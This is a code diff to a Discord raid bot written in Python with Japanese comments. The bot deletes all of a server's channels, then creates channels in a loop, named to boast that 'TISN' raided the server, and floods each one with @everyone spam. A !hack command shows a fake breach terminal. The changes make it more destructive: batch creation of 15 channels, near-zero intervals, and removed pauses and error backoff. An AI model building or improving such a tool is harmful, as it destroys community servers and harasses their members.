@@ -14,7 +14,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CREATE_INTERVAL = 0.001
+BATCH_SIZE = 15  # 一括作成する数
+CREATE_INTERVAL = 0.0001  # 限界まで短縮
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -68,19 +69,34 @@ async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
             await channel.send(text)
         except:
             break
-        try:
-            await asyncio.wait_for(stop_flag.wait(), timeout=0.05)
-        except asyncio.TimeoutError:
-            pass
 
 
 async def delete_all_channels_fast(guild: discord.Guild):
     tasks = [ch.delete() for ch in guild.channels]
     await asyncio.gather(*tasks, return_exceptions=True)
-    await asyncio.sleep(0.08)
     if guild.channels:
         tasks = [ch.delete() for ch in guild.channels]
         await asyncio.gather(*tasks, return_exceptions=True)
+
+
+async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
+    """一括作成＋即時並行送信"""
+    create_tasks = []
+    for i in range(BATCH_SIZE):
+        cnt = start_counter + i
+        create_tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{cnt}"))
+    try:
+        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+    except:
+        return start_counter
+
+    for ch in channels:
+        if isinstance(ch, discord.TextChannel):
+            task = asyncio.create_task(spam_channel(ch, guild))
+            background_tasks.add(task)
+            task.add_done_callback(background_tasks.discard)
+
+    return start_counter + BATCH_SIZE
 
 
 async def infinite_create_and_spam(guild: discord.Guild):
@@ -90,27 +106,17 @@ async def infinite_create_and_spam(guild: discord.Guild):
     except:
         pass
     await delete_all_channels_fast(guild)
+
     counter = 1
     while not stop_flag.is_set():
+        counter = await batch_create_and_spam(guild, counter)
         try:
-            new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{counter}")
-            task = asyncio.create_task(spam_channel(new_channel, guild))
-            background_tasks.add(task)
-            task.add_done_callback(background_tasks.discard)
-            counter += 1
-            try:
-                await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
-            except asyncio.TimeoutError:
-                pass
-        except:
-            try:
-                await asyncio.wait_for(stop_flag.wait(), timeout=3)
-            except asyncio.TimeoutError:
-                pass
+            await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
+        except asyncio.TimeoutError:
+            pass
 
 
 async def type_and_send(channel, text):
-    """✅ 一行ずつ表示・カタカタなし・最速"""
     lines = text.split("\n")
     output = ""
     msg = None
@@ -143,9 +149,9 @@ async def hack(ctx):
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
     hacker_code = "```ansi\n"
-    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╔═══════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════╝\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m╚═══════════════════════════════════════════════════╝\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
     hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
@@ -163,9 +169,7 @@ async def hack(ctx):
     hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
     hacker_code += "```\n"
     hacker_code += "**✅ ハッキング完了**\n"
-    # ✅ 一行ずつ表示
     await type_and_send(ch, hacker_code)
-    # 最後に実行ボタン
     async for msg in ch.history(limit=1):
         await msg.edit(view=StartButton(guild))
 
